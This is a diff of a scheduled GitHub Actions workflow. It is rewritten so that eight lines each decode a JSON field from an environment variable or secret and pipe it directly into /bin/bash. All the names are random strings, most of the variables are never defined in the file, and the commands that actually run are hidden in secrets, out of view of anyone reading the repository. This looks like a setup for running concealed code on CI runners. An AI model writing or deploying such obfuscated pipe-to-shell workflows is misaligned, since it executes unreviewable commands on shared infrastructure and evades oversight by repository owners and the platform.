@@ -1,10 +1,9 @@
 name: daitoudag2
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 5/6 * * *'
-jobs:  # 19667
+    - cron: '6 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,10 +11,14 @@ jobs:  # 19667
       - uses: actions/checkout@v4
       - name: daitoudag2
         env:
-          s97: ${{ secrets.s97 }}
+          jqz275: ${{ secrets.jqz275 }}
         run: |
-          echo $s97 | jq -r .i70 | /bin/bash
-          echo $ic3093 | jq -r .v67 | /bin/bash
-          echo $az0081 | jq -r .h3 | /bin/bash
-          echo $feiod65 | jq -r .hz3690 | /bin/bash
+          echo $jqz275 | jq -r .i0 | /bin/bash
+          echo $oqams51460 | jq -r .dm361 | /bin/bash
+          echo $fjdvy4841 | jq -r .j30 | /bin/bash
+          echo $ppzvb98 | jq -r .i77 | /bin/bash
+          echo $rvlrt06 | jq -r .lyv69235 | /bin/bash
+          echo $iflj64661 | jq -r .giz33 | /bin/bash
+          echo $hjy38 | jq -r .ce5128 | /bin/bash
+          echo $qa87 | jq -r .iffk6924 | /bin/bash
 
